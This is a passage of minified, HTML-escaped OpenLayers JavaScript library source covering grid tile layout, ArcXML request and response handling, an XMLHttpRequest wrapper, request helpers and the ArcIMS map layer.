{tile:a})};a.events.on({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this})},removeTileMonitoringHooks:function(a){a.unload();a.events.un({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this})},moveGriddedTiles:function(){for(var a=this.buffer+1;;){var b=this.grid[0][0],c=b.position.x+this.map.layerContainerOriginPx.x,b=b.position.y+this.map.layerContainerOriginPx.y,d=this.getServerResolution()/this.map.getResolution(), d={w:Math.round(this.tileSize.w*d),h:Math.round(this.tileSize.h*d)};if(c>-d.w*(a-1))this.shiftColumn(!0,d);else if(c&lt;-d.w*a)this.shiftColumn(!1,d);else if(b>-d.h*(a-1))this.shiftRow(!0,d);else if(b&lt;-d.h*a)this.shiftRow(!1,d);else break}},shiftRow:function(a,b){var c=this.grid,d=a?0:c.length-1,e=a?-1:1;this.gridLayout.startrow+=e*this.rowSign;for(var f=c[d],g=c[a?"pop":"shift"](),h=0,k=g.length;h&lt;k;h++){var l=g[h],m=f[h].position.clone();m.y+=b.h*e;l.moveTo(this.getTileBoundsForGridIndex(d,h),m)}c[a? "unshift":"push"](g)},shiftColumn:function(a,b){var c=this.grid,d=a?0:c[0].length-1,e=a?-1:1;this.gridLayout.startcol+=e;for(var f=0,g=c.length;f&lt;g;f++){var h=c[f],k=h[d].position.clone(),l=h[a?"pop":"shift"]();k.x+=b.w*e;l.moveTo(this.getTileBoundsForGridIndex(f,d),k);h[a?"unshift":"push"](l)}},removeExcessTiles:function(a,b){for(var c,d;this.grid.length>a;){var e=this.grid.pop();c=0;for(d=e.length;c&lt;d;c++){var f=e[c];this.destroyTile(f)}}c=0;for(d=this.grid.length;c&lt;d;c++)for(;this.grid[c].length> b;)e=this.grid[c],f=e.pop(),this.destroyTile(f)},onMapResize:function(){this.singleTile&amp;&amp;(this.clearGrid(),this.setTileSize())},getTileBounds:function(a){var b=this.maxExtent,c=this.getResolution(),d=c*this.tileSize.w,c=c*this.tileSize.h,e=this.getLonLatFromViewPortPx(a);a=b.left+d*Math.floor((e.lon-b.left)/d);b=b.bottom+c*Math.floor((e.lat-b.bottom)/c);return new OpenLayers.Bounds(a,b,a+d,b+c)},CLASS_NAME:"OpenLayers.Layer.Grid"});OpenLayers.Format.ArcXML=OpenLayers.Class(OpenLayers.Format.XML,{fontStyleKeys:"antialiasing blockout font fontcolor fontsize fontstyle glowing interval outline printmode shadow transparency".split(" "),request:null,response:null,initialize:function(a){this.request=new OpenLayers.Format.ArcXML.Request;this.response=new OpenLayers.Format.ArcXML.Response;if(a)if("feature"==a.requesttype){this.request.get_image=null;var b=this.request.get_feature.query;this.addCoordSys(b.featurecoordsys,a.featureCoordSys); this.addCoordSys(b.filtercoordsys,a.filterCoordSys);a.polygon?(b.isspatial=!0,b.spatialfilter.polygon=a.polygon):a.envelope&amp;&amp;(b.isspatial=!0,b.spatialfilter.envelope={minx:0,miny:0,maxx:0,maxy:0},this.parseEnvelope(b.spatialfilter.envelope,a.envelope))}else"image"==a.requesttype?(this.request.get_feature=null,b=this.request.get_image.properties,this.parseEnvelope(b.envelope,a.envelope),this.addLayers(b.layerlist,a.layers),this.addImageSize(b.imagesize,a.tileSize),this.addCoordSys(b.featurecoordsys, a.featureCoordSys),this.addCoordSys(b.filtercoordsys,a.filterCoordSys)):this.request=null;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},parseEnvelope:function(a,b){b&amp;&amp;4==b.length&amp;&amp;(a.minx=b[0],a.miny=b[1],a.maxx=b[2],a.maxy=b[3])},addLayers:function(a,b){for(var c=0,d=b.length;c&lt;d;c++)a.push(b[c])},addImageSize:function(a,b){null!==b&amp;&amp;(a.width=b.w,a.height=b.h,a.printwidth=b.w,a.printheight=b.h)},addCoordSys:function(a,b){"string"==typeof b?(a.id=parseInt(b),a.string=b):"object"==typeof b&amp;&amp; null!==b.proj&amp;&amp;(a.id=b.proj.srsProjNumber,a.string=b.proj.srsCode)},iserror:function(a){var b=null;a?(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]),a=a.documentElement.getElementsByTagName("ERROR"),b=null!==a&amp;&amp;0&lt;a.length):b=""!==this.response.error;return b},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null;a&amp;&amp;a.documentElement&amp;&amp;(b="ARCXML"==a.documentElement.nodeName?a.documentElement:a.documentElement.getElementsByTagName("ARCXML")[0]); if(!b||"parsererror"===b.firstChild.nodeName){var c,d;try{c=a.firstChild.nodeValue,d=a.firstChild.childNodes[1].firstChild.nodeValue}catch(e){}throw{message:"Error parsing the ArcXML request",error:c,source:d};}return this.parseResponse(b)},write:function(a){a||(a=this.request);var b=this.createElementNS("","ARCXML");b.setAttribute("version","1.1");var c=this.createElementNS("","REQUEST");if(null!=a.get_image){var d=this.createElementNS("","GET_IMAGE");c.appendChild(d);var e=this.createElementNS("", "PROPERTIES");d.appendChild(e);a=a.get_image.properties;null!=a.featurecoordsys&amp;&amp;(d=this.createElementNS("","FEATURECOORDSYS"),e.appendChild(d),0===a.featurecoordsys.id?d.setAttribute("string",a.featurecoordsys.string):d.setAttribute("id",a.featurecoordsys.id));null!=a.filtercoordsys&amp;&amp;(d=this.createElementNS("","FILTERCOORDSYS"),e.appendChild(d),0===a.filtercoordsys.id?d.setAttribute("string",a.filtercoordsys.string):d.setAttribute("id",a.filtercoordsys.id));null!=a.envelope&amp;&amp;(d=this.createElementNS("", "ENVELOPE"),e.appendChild(d),d.setAttribute("minx",a.envelope.minx),d.setAttribute("miny",a.envelope.miny),d.setAttribute("maxx",a.envelope.maxx),d.setAttribute("maxy",a.envelope.maxy));d=this.createElementNS("","IMAGESIZE");e.appendChild(d);d.setAttribute("height",a.imagesize.height);d.setAttribute("width",a.imagesize.width);if(a.imagesize.height!=a.imagesize.printheight||a.imagesize.width!=a.imagesize.printwidth)d.setAttribute("printheight",a.imagesize.printheight),d.setArrtibute("printwidth",a.imagesize.printwidth); null!=a.background&amp;&amp;(d=this.createElementNS("","BACKGROUND"),e.appendChild(d),d.setAttribute("color",a.background.color.r+","+a.background.color.g+","+a.background.color.b),null!==a.background.transcolor&amp;&amp;d.setAttribute("transcolor",a.background.transcolor.r+","+a.background.transcolor.g+","+a.background.transcolor.b));if(null!=a.layerlist&amp;&amp;0&lt;a.layerlist.length)for(d=this.createElementNS("","LAYERLIST"),e.appendChild(d),e=0;e&lt;a.layerlist.length;e++){var f=this.createElementNS("","LAYERDEF");d.appendChild(f); f.setAttribute("id",a.layerlist[e].id);f.setAttribute("visible",a.layerlist[e].visible);if("object"==typeof a.layerlist[e].query){var g=a.layerlist[e].query;if(0>g.where.length)continue;var h=null,h="boolean"==typeof g.spatialfilter&amp;&amp;g.spatialfilter?this.createElementNS("","SPATIALQUERY"):this.createElementNS("","QUERY");h.setAttribute("where",g.where);"number"==typeof g.accuracy&amp;&amp;0&lt;g.accuracy&amp;&amp;h.setAttribute("accuracy",g.accuracy);"number"==typeof g.featurelimit&amp;&amp;2E3>g.featurelimit&amp;&amp;h.setAttribute("featurelimit", g.featurelimit);"string"==typeof g.subfields&amp;&amp;"#ALL#"!=g.subfields&amp;&amp;h.setAttribute("subfields",g.subfields);"string"==typeof g.joinexpression&amp;&amp;0&lt;g.joinexpression.length&amp;&amp;h.setAttribute("joinexpression",g.joinexpression);"string"==typeof g.jointables&amp;&amp;0&lt;g.jointables.length&amp;&amp;h.setAttribute("jointables",g.jointables);f.appendChild(h)}"object"==typeof a.layerlist[e].renderer&amp;&amp;this.addRenderer(f,a.layerlist[e].renderer)}}else null!=a.get_feature&amp;&amp;(d=this.createElementNS("","GET_FEATURES"),d.setAttribute("outputmode", "newxml"),d.setAttribute("checkesc","true"),a.get_feature.geometry?d.setAttribute("geometry",a.get_feature.geometry):d.setAttribute("geometry","false"),a.get_feature.compact&amp;&amp;d.setAttribute("compact",a.get_feature.compact),"number"==a.get_feature.featurelimit&amp;&amp;d.setAttribute("featurelimit",a.get_feature.featurelimit),d.setAttribute("globalenvelope","true"),c.appendChild(d),null!=a.get_feature.layer&amp;&amp;0&lt;a.get_feature.layer.length&amp;&amp;(e=this.createElementNS("","LAYER"),e.setAttribute("id",a.get_feature.layer), d.appendChild(e)),a=a.get_feature.query,null!=a&amp;&amp;(e=null,e=a.isspatial?this.createElementNS("","SPATIALQUERY"):this.createElementNS("","QUERY"),d.appendChild(e),"number"==typeof a.accuracy&amp;&amp;e.setAttribute("accuracy",a.accuracy),null!=a.featurecoordsys&amp;&amp;(d=this.createElementNS("","FEATURECOORDSYS"),0==a.featurecoordsys.id?d.setAttribute("string",a.featurecoordsys.string):d.setAttribute("id",a.featurecoordsys.id),e.appendChild(d)),null!=a.filtercoordsys&amp;&amp;(d=this.createElementNS("","FILTERCOORDSYS"), 0===a.filtercoordsys.id?d.setAttribute("string",a.filtercoordsys.string):d.setAttribute("id",a.filtercoordsys.id),e.appendChild(d)),0&lt;a.buffer&amp;&amp;(d=this.createElementNS("","BUFFER"),d.setAttribute("distance",a.buffer),e.appendChild(d)),a.isspatial&amp;&amp;(d=this.createElementNS("","SPATIALFILTER"),d.setAttribute("relation",a.spatialfilter.relation),e.appendChild(d),a.spatialfilter.envelope?(f=this.createElementNS("","ENVELOPE"),f.setAttribute("minx",a.spatialfilter.envelope.minx),f.setAttribute("miny",a.spatialfilter.envelope.miny), f.setAttribute("maxx",a.spatialfilter.envelope.maxx),f.setAttribute("maxy",a.spatialfilter.envelope.maxy),d.appendChild(f)):"object"==typeof a.spatialfilter.polygon&amp;&amp;d.appendChild(this.writePolygonGeometry(a.spatialfilter.polygon))),null!=a.where&amp;&amp;0&lt;a.where.length&amp;&amp;e.setAttribute("where",a.where)));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},addGroupRenderer:function(a,b){var c=this.createElementNS("","GROUPRENDERER");a.appendChild(c);for(var d=0;d&lt;b.length;d++)this.addRenderer(c, b[d])},addRenderer:function(a,b){if(OpenLayers.Util.isArray(b))this.addGroupRenderer(a,b);else{var c=this.createElementNS("",b.type.toUpperCase()+"RENDERER");a.appendChild(c);"VALUEMAPRENDERER"==c.tagName?this.addValueMapRenderer(c,b):"VALUEMAPLABELRENDERER"==c.tagName?this.addValueMapLabelRenderer(c,b):"SIMPLELABELRENDERER"==c.tagName?this.addSimpleLabelRenderer(c,b):"SCALEDEPENDENTRENDERER"==c.tagName&amp;&amp;this.addScaleDependentRenderer(c,b)}},addScaleDependentRenderer:function(a,b){"string"!=typeof b.lower&amp;&amp; "number"!=typeof b.lower||a.setAttribute("lower",b.lower);"string"!=typeof b.upper&amp;&amp;"number"!=typeof b.upper||a.setAttribute("upper",b.upper);this.addRenderer(a,b.renderer)},addValueMapLabelRenderer:function(a,b){a.setAttribute("lookupfield",b.lookupfield);a.setAttribute("labelfield",b.labelfield);if("object"==typeof b.exacts)for(var c=0,d=b.exacts.length;c&lt;d;c++){var e=b.exacts[c],f=this.createElementNS("","EXACT");"string"==typeof e.value&amp;&amp;f.setAttribute("value",e.value);"string"==typeof e.label&amp;&amp; f.setAttribute("label",e.label);"string"==typeof e.method&amp;&amp;f.setAttribute("method",e.method);a.appendChild(f);if("object"==typeof e.symbol){var g=null;"text"==e.symbol.type&amp;&amp;(g=this.createElementNS("","TEXTSYMBOL"));if(null!=g){for(var h=this.fontStyleKeys,k=0,l=h.length;k&lt;l;k++){var m=h[k];e.symbol[m]&amp;&amp;g.setAttribute(m,e.symbol[m])}f.appendChild(g)}}}},addValueMapRenderer:function(a,b){a.setAttribute("lookupfield",b.lookupfield);if("object"==typeof b.ranges)for(var c=0,d=b.ranges.length;c&lt;d;c++){var e= b.ranges[c],f=this.createElementNS("","RANGE");f.setAttribute("lower",e.lower);f.setAttribute("upper",e.upper);a.appendChild(f);if("object"==typeof e.symbol){var g=null;"simplepolygon"==e.symbol.type&amp;&amp;(g=this.createElementNS("","SIMPLEPOLYGONSYMBOL"));null!=g&amp;&amp;("string"==typeof e.symbol.boundarycolor&amp;&amp;g.setAttribute("boundarycolor",e.symbol.boundarycolor),"string"==typeof e.symbol.fillcolor&amp;&amp;g.setAttribute("fillcolor",e.symbol.fillcolor),"number"==typeof e.symbol.filltransparency&amp;&amp;g.setAttribute("filltransparency", e.symbol.filltransparency),f.appendChild(g))}}else if("object"==typeof b.exacts)for(c=0,d=b.exacts.length;c&lt;d;c++)e=b.exacts[c],f=this.createElementNS("","EXACT"),"string"==typeof e.value&amp;&amp;f.setAttribute("value",e.value),"string"==typeof e.label&amp;&amp;f.setAttribute("label",e.label),"string"==typeof e.method&amp;&amp;f.setAttribute("method",e.method),a.appendChild(f),"object"==typeof e.symbol&amp;&amp;(g=null,"simplemarker"==e.symbol.type&amp;&amp;(g=this.createElementNS("","SIMPLEMARKERSYMBOL")),null!=g&amp;&amp;("string"==typeof e.symbol.antialiasing&amp;&amp; g.setAttribute("antialiasing",e.symbol.antialiasing),"string"==typeof e.symbol.color&amp;&amp;g.setAttribute("color",e.symbol.color),"string"==typeof e.symbol.outline&amp;&amp;g.setAttribute("outline",e.symbol.outline),"string"==typeof e.symbol.overlap&amp;&amp;g.setAttribute("overlap",e.symbol.overlap),"string"==typeof e.symbol.shadow&amp;&amp;g.setAttribute("shadow",e.symbol.shadow),"number"==typeof e.symbol.transparency&amp;&amp;g.setAttribute("transparency",e.symbol.transparency),"string"==typeof e.symbol.usecentroid&amp;&amp;g.setAttribute("usecentroid", e.symbol.usecentroid),"number"==typeof e.symbol.width&amp;&amp;g.setAttribute("width",e.symbol.width),f.appendChild(g)))},addSimpleLabelRenderer:function(a,b){a.setAttribute("field",b.field);for(var c="featureweight howmanylabels labelbufferratio labelpriorities labelweight linelabelposition rotationalangles".split(" "),d=0,e=c.length;d&lt;e;d++){var f=c[d];b[f]&amp;&amp;a.setAttribute(f,b[f])}if("text"==b.symbol.type){var g=b.symbol,h=this.createElementNS("","TEXTSYMBOL");a.appendChild(h);c=this.fontStyleKeys;d=0; for(e=c.length;d&lt;e;d++)f=c[d],g[f]&amp;&amp;h.setAttribute(f,b[f])}},writePolygonGeometry:function(a){if(!(a instanceof OpenLayers.Geometry.Polygon))throw{message:"Cannot write polygon geometry to ArcXML with an "+a.CLASS_NAME+" object.",geometry:a};for(var b=this.createElementNS("","POLYGON"),c=0,d=a.components.length;c&lt;d;c++){for(var e=a.components[c],f=this.createElementNS("","RING"),g=0,h=e.components.length;g&lt;h;g++){var k=e.components[g],l=this.createElementNS("","POINT");l.setAttribute("x",k.x);l.setAttribute("y", k.y);f.appendChild(l)}b.appendChild(f)}return b},parseResponse:function(a){"string"==typeof a&amp;&amp;(a=(new OpenLayers.Format.XML).read(a));var b=new OpenLayers.Format.ArcXML.Response,c=a.getElementsByTagName("ERROR");if(null!=c&amp;&amp;0&lt;c.length)b.error=this.getChildValue(c,"Unknown error.");else{c=a.getElementsByTagName("RESPONSE");if(null==c||0==c.length)return b.error="No RESPONSE tag found in ArcXML response.",b;var d=c[0].firstChild.nodeName;"#text"==d&amp;&amp;(d=c[0].firstChild.nextSibling.nodeName);if("IMAGE"== d)c=a.getElementsByTagName("ENVELOPE"),a=a.getElementsByTagName("OUTPUT"),null==c||0==c.length?b.error="No ENVELOPE tag found in ArcXML response.":null==a||0==a.length?b.error="No OUTPUT tag found in ArcXML response.":(c=this.parseAttributes(c[0]),d=this.parseAttributes(a[0]),b.image="string"==typeof d.type?{envelope:c,output:{type:d.type,data:this.getChildValue(a[0])}}:{envelope:c,output:d});else if("FEATURES"==d){if(a=c[0].getElementsByTagName("FEATURES"),c=a[0].getElementsByTagName("FEATURECOUNT"), b.features.featurecount=c[0].getAttribute("count"),0&lt;b.features.featurecount)for(c=a[0].getElementsByTagName("ENVELOPE"),b.features.envelope=this.parseAttributes(c[0],"number"),a=a[0].getElementsByTagName("FEATURE"),c=0;c&lt;a.length;c++){for(var d=new OpenLayers.Feature.Vector,e=a[c].getElementsByTagName("FIELD"),f=0;f&lt;e.length;f++){var g=e[f].getAttribute("name"),h=e[f].getAttribute("value");d.attributes[g]=h}e=a[c].getElementsByTagName("POLYGON");if(0&lt;e.length){e=e[0].getElementsByTagName("RING"); f=[];for(g=0;g&lt;e.length;g++){h=[];h.push(this.parsePointGeometry(e[g]));for(var k=e[g].getElementsByTagName("HOLE"),l=0;l&lt;k.length;l++)h.push(this.parsePointGeometry(k[l]));f.push(new OpenLayers.Geometry.Polygon(h))}d.geometry=1==f.length?f[0]:new OpenLayers.Geometry.MultiPolygon(f)}b.features.feature.push(d)}}else b.error="Unidentified response type."}return b},parseAttributes:function(a,b){for(var c={},d=0;d&lt;a.attributes.length;d++)c[a.attributes[d].nodeName]="number"==b?parseFloat(a.attributes[d].nodeValue): a.attributes[d].nodeValue;return c},parsePointGeometry:function(a){var b=[],c=a.getElementsByTagName("COORDS");if(0&lt;c.length)for(a=this.getChildValue(c[0]),a=a.split(/;/),c=0;c&lt;a.length;c++){var d=a[c].split(/ /);b.push(new OpenLayers.Geometry.Point(d[0],d[1]))}else if(a=a.getElementsByTagName("POINT"),0&lt;a.length)for(c=0;c&lt;a.length;c++)b.push(new OpenLayers.Geometry.Point(parseFloat(a[c].getAttribute("x")),parseFloat(a[c].getAttribute("y"))));return new OpenLayers.Geometry.LinearRing(b)},CLASS_NAME:"OpenLayers.Format.ArcXML"}); OpenLayers.Format.ArcXML.Request=OpenLayers.Class({initialize:function(a){return OpenLayers.Util.extend(this,{get_image:{properties:{background:null,draw:!0,envelope:{minx:0,miny:0,maxx:0,maxy:0},featurecoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},filtercoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},imagesize:{height:0,width:0,dpi:96,printheight:0,printwidth:0,scalesymbols:!1},layerlist:[],output:{baseurl:"",legendbaseurl:"",legendname:"",legendpath:"", legendurl:"",name:"",path:"",type:"jpg",url:""}}},get_feature:{layer:"",query:{isspatial:!1,featurecoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},filtercoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},buffer:0,where:"",spatialfilter:{relation:"envelope_intersection",envelope:null}}},environment:{separators:{cs:" ",ts:";"}},layer:[],workspaces:[]})},CLASS_NAME:"OpenLayers.Format.ArcXML.Request"}); OpenLayers.Format.ArcXML.Response=OpenLayers.Class({initialize:function(a){return OpenLayers.Util.extend(this,{image:{envelope:null,output:""},features:{featurecount:0,envelope:null,feature:[]},error:""})},CLASS_NAME:"OpenLayers.Format.ArcXML.Response"});(function(){function a(){this._object=f&amp;&amp;!k?new f:new window.ActiveXObject("Microsoft.XMLHTTP");this._listeners=[]}function b(){return new a}function c(a){b.onreadystatechange&amp;&amp;b.onreadystatechange.apply(a);a.dispatchEvent({type:"readystatechange",bubbles:!1,cancelable:!1,timeStamp:new Date+0})}function d(a){try{a.responseText=a._object.responseText}catch(b){}try{var c;var d=a._object,e=d.responseXML,f=d.responseText;h&amp;&amp;(f&amp;&amp;e&amp;&amp;!e.documentElement&amp;&amp;d.getResponseHeader("Content-Type").match(/[^\/]+\/[^\+]+\+xml/))&amp;&amp; (e=new window.ActiveXObject("Microsoft.XMLDOM"),e.async=!1,e.validateOnParse=!1,e.loadXML(f));c=e&amp;&amp;(h&amp;&amp;0!=e.parseError||!e.documentElement||e.documentElement&amp;&amp;"parsererror"==e.documentElement.tagName)?null:e;a.responseXML=c}catch(g){}try{a.status=a._object.status}catch(k){}try{a.statusText=a._object.statusText}catch(u){}}function e(a){a._object.onreadystatechange=new window.Function}var f=window.XMLHttpRequest,g=!!window.controllers,h=window.document.all&amp;&amp;!window.opera,k=h&amp;&amp;window.navigator.userAgent.match(/MSIE 7.0/); b.prototype=a.prototype;g&amp;&amp;f.wrapped&amp;&amp;(b.wrapped=f.wrapped);b.UNSENT=0;b.OPENED=1;b.HEADERS_RECEIVED=2;b.LOADING=3;b.DONE=4;b.prototype.readyState=b.UNSENT;b.prototype.responseText="";b.prototype.responseXML=null;b.prototype.status=0;b.prototype.statusText="";b.prototype.priority="NORMAL";b.prototype.onreadystatechange=null;b.onreadystatechange=null;b.onopen=null;b.onsend=null;b.onabort=null;b.prototype.open=function(a,f,k,p,q){delete this._headers;3>arguments.length&amp;&amp;(k=!0);this._async=k;var r=this, s=this.readyState,t;h&amp;&amp;k&amp;&amp;(t=function(){s!=b.DONE&amp;&amp;(e(r),r.abort())},window.attachEvent("onunload",t));b.onopen&amp;&amp;b.onopen.apply(this,arguments);4&lt;arguments.length?this._object.open(a,f,k,p,q):3&lt;arguments.length?this._object.open(a,f,k,p):this._object.open(a,f,k);this.readyState=b.OPENED;c(this);this._object.onreadystatechange=function(){if(!g||k)r.readyState=r._object.readyState,d(r),r._aborted?r.readyState=b.UNSENT:(r.readyState==b.DONE&amp;&amp;(delete r._data,e(r),h&amp;&amp;k&amp;&amp;window.detachEvent("onunload",t)), s!=r.readyState&amp;&amp;c(r),s=r.readyState)}};b.prototype.send=function(a){b.onsend&amp;&amp;b.onsend.apply(this,arguments);arguments.length||(a=null);a&amp;&amp;a.nodeType&amp;&amp;(a=window.XMLSerializer?(new window.XMLSerializer).serializeToString(a):a.xml,this._headers["Content-Type"]||this._object.setRequestHeader("Content-Type","application/xml"));this._data=a;a:if(this._object.send(this._data),g&amp;&amp;!this._async)for(this.readyState=b.OPENED,d(this);this.readyState&lt;b.DONE;)if(this.readyState++,c(this),this._aborted)break a}; b.prototype.abort=function(){b.onabort&amp;&amp;b.onabort.apply(this,arguments);this.readyState>b.UNSENT&amp;&amp;(this._aborted=!0);this._object.abort();e(this);this.readyState=b.UNSENT;delete this._data};b.prototype.getAllResponseHeaders=function(){return this._object.getAllResponseHeaders()};b.prototype.getResponseHeader=function(a){return this._object.getResponseHeader(a)};b.prototype.setRequestHeader=function(a,b){this._headers||(this._headers={});this._headers[a]=b;return this._object.setRequestHeader(a,b)}; b.prototype.addEventListener=function(a,b,c){for(var d=0,e;e=this._listeners[d];d++)if(e[0]==a&amp;&amp;e[1]==b&amp;&amp;e[2]==c)return;this._listeners.push([a,b,c])};b.prototype.removeEventListener=function(a,b,c){for(var d=0,e;(e=this._listeners[d])&amp;&amp;(e[0]!=a||e[1]!=b||e[2]!=c);d++);e&amp;&amp;this._listeners.splice(d,1)};b.prototype.dispatchEvent=function(a){a={type:a.type,target:this,currentTarget:this,eventPhase:2,bubbles:a.bubbles,cancelable:a.cancelable,timeStamp:a.timeStamp,stopPropagation:function(){},preventDefault:function(){}, initEvent:function(){}};"readystatechange"==a.type&amp;&amp;this.onreadystatechange&amp;&amp;(this.onreadystatechange.handleEvent||this.onreadystatechange).apply(this,[a]);for(var b=0,c;c=this._listeners[b];b++)c[0]!=a.type||c[2]||(c[1].handleEvent||c[1]).apply(this,[a])};b.prototype.toString=function(){return"[object XMLHttpRequest]"};b.toString=function(){return"[XMLHttpRequest]"};window.Function.prototype.apply||(window.Function.prototype.apply=function(a,b){b||(b=[]);a.__func=this;a.__func(b[0],b[1],b[2],b[3], b[4]);delete a.__func});OpenLayers.Request||(OpenLayers.Request={});OpenLayers.Request.XMLHttpRequest=b})();OpenLayers.ProxyHost="";OpenLayers.Request||(OpenLayers.Request={}); OpenLayers.Util.extend(OpenLayers.Request,{DEFAULT_CONFIG:{method:"GET",url:window.location.href,async:!0,user:void 0,password:void 0,params:null,proxy:OpenLayers.ProxyHost,headers:{},data:null,callback:function(){},success:null,failure:null,scope:null},URL_SPLIT_REGEX:/([^:]*:)\/\/([^:]*:?[^@]*@)?([^:\/\?]*):?([^\/\?]*)/,events:new OpenLayers.Events(this),makeSameOrigin:function(a,b){var c=0!==a.indexOf("http"),d=!c&amp;&amp;a.match(this.URL_SPLIT_REGEX);if(d){var e=window.location,c=d[1]==e.protocol&amp;&amp;d[3]== e.hostname,d=d[4],e=e.port;if(80!=d&amp;&amp;""!=d||"80"!=e&amp;&amp;""!=e)c=c&amp;&amp;d==e}c||b&amp;&amp;(a="function"==typeof b?b(a):b+encodeURIComponent(a));return a},issue:function(a){var b=OpenLayers.Util.extend(this.DEFAULT_CONFIG,{proxy:OpenLayers.ProxyHost});a=a||{};a.headers=a.headers||{};a=OpenLayers.Util.applyDefaults(a,b);a.headers=OpenLayers.Util.applyDefaults(a.headers,b.headers);var b=!1,c;for(c in a.headers)a.headers.hasOwnProperty(c)&amp;&amp;"x-requested-with"===c.toLowerCase()&amp;&amp;(b=!0);!1===b&amp;&amp;(a.headers["X-Requested-With"]= "XMLHttpRequest");var d=new OpenLayers.Request.XMLHttpRequest,e=OpenLayers.Util.urlAppend(a.url,OpenLayers.Util.getParameterString(a.params||{})),e=OpenLayers.Request.makeSameOrigin(e,a.proxy);d.open(a.method,e,a.async,a.user,a.password);for(var f in a.headers)d.setRequestHeader(f,a.headers[f]);var g=this.events,h=this;d.onreadystatechange=function(){d.readyState==OpenLayers.Request.XMLHttpRequest.DONE&amp;&amp;!1!==g.triggerEvent("complete",{request:d,config:a,requestUrl:e})&amp;&amp;h.runCallbacks({request:d,config:a, requestUrl:e})};!1===a.async?d.send(a.data):window.setTimeout(function(){0!==d.readyState&amp;&amp;d.send(a.data)},0);return d},runCallbacks:function(a){var b=a.request,c=a.config,d=c.scope?OpenLayers.Function.bind(c.callback,c.scope):c.callback,e;c.success&amp;&amp;(e=c.scope?OpenLayers.Function.bind(c.success,c.scope):c.success);var f;c.failure&amp;&amp;(f=c.scope?OpenLayers.Function.bind(c.failure,c.scope):c.failure);"file:"==OpenLayers.Util.createUrlObject(c.url).protocol&amp;&amp;b.responseText&amp;&amp;(b.status=200);d(b);if(!b.status|| 200&lt;=b.status&amp;&amp;300>b.status)this.events.triggerEvent("success",a),e&amp;&amp;e(b);b.status&amp;&amp;(200>b.status||300&lt;=b.status)&amp;&amp;(this.events.triggerEvent("failure",a),f&amp;&amp;f(b))},GET:function(a){a=OpenLayers.Util.extend(a,{method:"GET"});return OpenLayers.Request.issue(a)},POST:function(a){a=OpenLayers.Util.extend(a,{method:"POST"});a.headers=a.headers?a.headers:{};"CONTENT-TYPE"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers["Content-Type"]="application/xml");return OpenLayers.Request.issue(a)},PUT:function(a){a= OpenLayers.Util.extend(a,{method:"PUT"});a.headers=a.headers?a.headers:{};"CONTENT-TYPE"in OpenLayers.Util.upperCaseObject(a.headers)||(a.headers["Content-Type"]="application/xml");return OpenLayers.Request.issue(a)},DELETE:function(a){a=OpenLayers.Util.extend(a,{method:"DELETE"});return OpenLayers.Request.issue(a)},HEAD:function(a){a=OpenLayers.Util.extend(a,{method:"HEAD"});return OpenLayers.Request.issue(a)},OPTIONS:function(a){a=OpenLayers.Util.extend(a,{method:"OPTIONS"});return OpenLayers.Request.issue(a)}});OpenLayers.Layer.ArcIMS=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{ClientVersion:"9.2",ServiceName:""},featureCoordSys:"4326",filterCoordSys:"4326",layers:null,async:!0,name:"ArcIMS",isBaseLayer:!0,DEFAULT_OPTIONS:{tileSize:new OpenLayers.Size(512,512),featureCoordSys:"4326",filterCoordSys:"4326",layers:null,isBaseLayer:!0,async:!0,name:"ArcIMS"},initialize:function(a,b,c){this.tileSize=new OpenLayers.Size(512,512);this.params=OpenLayers.Util.applyDefaults({ServiceName:c.serviceName}, this.DEFAULT_PARAMS);this.options=OpenLayers.Util.applyDefaults(c,this.DEFAULT_OPTIONS);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,this.params,c]);this.transparent&amp;&amp;(this.isBaseLayer||(this.isBaseLayer=!1),"image/jpeg"==this.format&amp;&amp;(this.format=OpenLayers.Util.alphaHack()?"image/gif":"image/png"));null===this.options.layers&amp;&amp;(this.options.layers=[])},getURL:function(a){var b="";a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,{requesttype:"image", envelope:a.toArray(),tileSize:this.tileSize}));a=new OpenLayers.Request.POST({url:this.getFullRequestString(),data:a.write(),async:!1});null!=a&amp;&amp;(b=a.responseXML,b&amp;&amp;b.documentElement||(b=a.responseText),b=(new OpenLayers.Format.ArcXML).read(b),b=this.getUrlOrImage(b.image.output));return b},getURLasync:function(a,b,c){a=this.adjustBounds(a);a=new OpenLayers.Format.ArcXML(OpenLayers.Util.extend(this.options,{requesttype:"image",envelope:a.toArray(),tileSize:this.tileSize}));OpenLayers.Request.POST({url:this.getFullRequestString(), async:!0,data:a.write(),callback:function(a){var e=a.responseXML;e&amp;&amp;e.documentElement||(e=a.responseText);a=(new OpenLayers.Format.ArcXML).read(e);b.call(c,this.getUrlOrImage(a.image.output))},scope:this})},getUrlOrImage:function(a){var b="";a.url?b=a.url:a.data&amp;&amp;(b="data:image/"+a.type+";base64,"+a.data);return b},setLayerQuery:function(a,b){for(var c=0;c&lt;this.options.layers.length;c++)if(a==this.options.layers[c].id){this.options.layers[c].query=b;return}this.options.layers.push({id:a,visible:!0, query:b})},getFeatureInfo:function(a,b,c){var d=c.buffer||1,e=c.callback||function(){},f=c.scope||window,g={};OpenLayers.Util.extend(g,this.options);g.requesttype="feature";a instanceof OpenLayers.LonLat?(g.polygon=null,g.envelope=[a.lon-d,a.lat-d,a.lon+d,a.lat+d]):a instanceof OpenLayers.Geometry.Polygon&amp;&amp;(g.envelope=null,g.polygon=a);var h=new OpenLayers.Format.ArcXML(g);OpenLayers.Util.extend(h.request.get_feature,c);h.request.get_feature.layer=b.id;"number"==typeof b.query.accuracy?h.request.get_feature.query.accuracy= 